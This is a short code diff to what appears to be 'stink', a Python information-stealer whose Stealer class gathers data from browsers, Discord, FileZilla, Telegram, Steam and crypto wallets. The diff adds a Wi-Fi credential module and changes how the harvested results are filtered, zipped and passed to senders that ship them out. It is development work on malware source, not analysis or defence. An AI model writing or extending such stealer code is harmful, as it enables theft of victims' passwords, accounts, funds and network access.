@@ -8,7 +8,7 @@ from stink.enums import Features, Utils
 from stink.utils import Autostart, Message
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
-from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
+from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets, Wifi
 
 
 class Stealer(Thread):
@@ -196,7 +196,8 @@ class Stealer(Thread):
                 ])
             pool.close()
 
-            data = self.__storage.create_zip([item for sublist in results for item in sublist])
+            filtered_results = [item for item in results if item]
+            data = self.__storage.create_zip([item for sublist in filtered_results for item in sublist])
 
             for sender in self.__senders:
                 sender.run(self.__config.ZipName, data)
